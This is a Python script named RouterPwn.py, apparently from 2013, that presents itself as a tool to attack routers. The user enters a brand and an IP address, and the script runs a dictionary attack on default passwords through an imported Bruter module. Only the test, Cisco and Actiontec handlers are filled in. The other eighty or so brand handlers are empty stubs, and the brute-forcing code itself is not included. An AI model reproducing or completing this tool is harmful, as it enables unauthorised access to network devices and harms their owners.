#!/usr/bin/env python
#title           :RouterPwn.py
#description     :Attempts to connect to router using default values
#author          :j311yf1sh
#date            :8/28/2013
#version         :0.0
#notes           :Uknown
#python_version  :3.3.2
#Requires        :Bruter.py
#==============================================================================

import Bruter #import my bruter class
import os
import sys

# All functions for brands

def test(IP):   
    Password_List = 'test.txt'
    User = 'admin'
    Bruter.DictBruter(IP,Password_List,User)
	
def cisco(IP):
    Password_List = 'cisco.txt'
    User = 'admin'
    Bruter.DictBruter(IP,Password_List,User)

def actiontec(IP):
    Password_List = 'actiontec.txt'
    User = 'admin'
    Bruter.DictBruter(IP,Password_List,User)
    
def adtran(IP):
    pass
def allied_telesis(IP):
    pass
def aluratek(IP):
    pass
def asante(IP):
    pass
def asus(IP):
    pass
def atlas(IP):
    pass
def avaya_intl(IP):
    pass
def avocent(IP):
    pass
def axiom(IP):
    pass
def barracuda(IP):
    pass
def belkin(IP):
    pass
def black_box(IP):
    pass
def bogen_communications(IP):
    pass
def brocade(IP):
    pass
def cabletron(IP):
    pass
def cp(IP):
    pass
def cradlepoint(IP):
    pass
def cyberdata(IP):
    pass
def d_link(IP):
    pass
def dataram(IP):
    pass
def dell(IP):
    pass
def dialogic(IP):
    pass
def digi_international(IP):
    pass
def dnpg(IP):
    pass
def dynex(IP):
    pass
def edgewater_networks(IP):
    pass
def enterasys(IP):
    pass
def extreme_networks(IP):
    pass
def general_electric(IP):
    pass
def generic(IP):
    pass
def gigaram(IP):
    pass
def global_marketing_partners(IP):
    pass
def hawking_tech(IP):
    pass
def hp(IP):
    pass
def huawei(IP):
    pass
def ibm(IP):
    pass
def imc(IP):
    pass
def infineon(IP):
    pass
def ingram(IP):
    pass
def intel(IP):
    pass
def intellinet(IP):
    pass
def juniper(IP):
    pass
def kingston(IP):
    pass
def lantronix(IP):
    pass
def leviton(IP):
    pass
def linkskey(IP):
    pass
def luxul(IP):
    pass
def meraki(IP):
    pass
def microsoft(IP):
    pass
def monoprice(IP):
    pass
def motorola(IP):
    pass
def muilti_tech(IP):
    pass
def multitech_systems(IP):
    pass
def netgear(IP):
    pass
def netopia(IP):
    pass
def nexaira(IP):
    pass
def notel(IP):
    pass
def on_networks(IP):
    pass
def paradyne(IP):
    pass
def patton_electronics(IP):
    pass
def perle_systems(IP):
    pass
def proxim(IP):
    pass
def qlogic(IP):
    pass
def raritan(IP):
    pass
def sapido(IP):
    pass
def siemens(IP):
    pass
def sixnet(IP):
    pass
def skil(IP):
    pass
def smc(IP):
    pass
def startech_com(IP):
    pass
def supermicro(IP):
    pass
def tp_link(IP):
    pass
def trendnet(IP):
    pass
def tripp_lite(IP):
    pass
def us_robotics(IP):
    pass
def valcom(IP):
    pass
def vision(IP):
    pass
def wd(IP):
    pass
def xblue_networks(IP):
    pass
def zhone_technologies_inc(IP):
    pass
def zoom_telephonics(IP):
    pass
def zyxel(IP):
    pass
def threecom(IP):
    pass

while(1):
    
    os.system("CLS") #clear Screen
    
    #Print all of the instructions / Titles to the screen
    print("                             RouterPwn!\n")
    print("         RouterPwn will attack routers by  dictionary/default passwords.")
    print("         All words will be converted to lowercase")
    print("         All numbers in names should be spelt instead of typed")
    print("         Spaces and - should be typed as _")
    print("         Type Exit to quit\n")
    
    Brand = input('         Make-> ')
    Brand = Brand.lower() #make brand lowercase
    if Brand == 'exit':
        sys.exit()
    IP = input('         IP-> ')  #'192.168.1.254'
    #PORT = input('Port-> ')

    if Brand == 'test':
        test(IP)
    elif Brand == 'actiontec':
       actiontec(IP)
    elif Brand == 'cisco':
       cisco(IP) 
